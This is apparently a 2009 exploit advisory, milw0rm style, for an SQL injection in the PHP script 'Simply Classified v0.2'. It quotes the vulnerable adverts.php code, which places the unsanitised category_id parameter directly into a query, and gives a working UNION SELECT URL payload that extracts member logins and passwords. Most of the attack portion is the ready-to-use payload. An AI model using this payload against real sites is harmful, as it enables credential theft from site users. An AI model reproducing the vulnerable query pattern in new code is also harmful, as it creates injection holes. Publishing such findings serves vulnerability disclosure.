@@ -1,0 +1,61 @@
+==============================================================================
+                      _      _       _          _      _   _ 
+                     / \    | |     | |        / \    | | | |
+                    / _ \   | |     | |       / _ \   | |_| |
+                   / ___ \  | |___  | |___   / ___ \  |  _  |
+   IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|
+                                                             
+
+==============================================================================
+                      ____   _  _     _   _    ___    _  __
+                     / ___| | || |   | \ | |  / _ \  | |/ /
+                    | |  _  | || |_  |  \| | | | | | | ' / 
+                    | |_| | |__   _| | |\  | | |_| | | . \ 
+                     \____|    |_|   |_| \_|  \___/  |_|\_\ A Baloch From Iran
+
+==============================================================================
+	Simply Classified v0.2 (category_id) SQL Injection Vulnerability
+==============================================================================
+
+	[»] Script:             [ Simply Classified v0.2 ]
+	[»] Language:           [ PHP, MySQL ]
+	[»] Website:            [ http://www.hotscripts.com/listing/simply_classifieds/ ]
+	[»] Type:               [ Free|OS ]
+	[»] Today:              [ 26032009 ]
+	[»] Founder:            [ G4N0K | mail[.]ganok[sh!t]gmail.com ]
+
+
+===[ code! ]===
+
+	[+] adverts.php, 33-34
+
+			{...}
+			<?php
+				$id = $_GET['category_id']; // <== you know!
+				$query = "SELECT * FROM type WHERE id=$id" ; // <== did you got it!, damn, check it again.
+						$result = mysql_query($query);
+						$row = mysql_fetch_array($result);
+			?>
+			{...}
+			
+
+	
+===[ XPL ]===
+
+	[»] http://127.0.0.1/classified/adverts.php?category_id=5 UNION ALL SELECT 1,2,concat(login,0x3a,passwd),4,5,6,7,8,9,10 FROM members
+
+
+===[ LIVE ]===
+
+	[»] N/A
+
+	
+===[ Greetz ]===
+
+	[»] ALLAH
+
+===============================================================================
+ D-End...
+===============================================================================
+
+# milw0rm.com [2009-03-27]
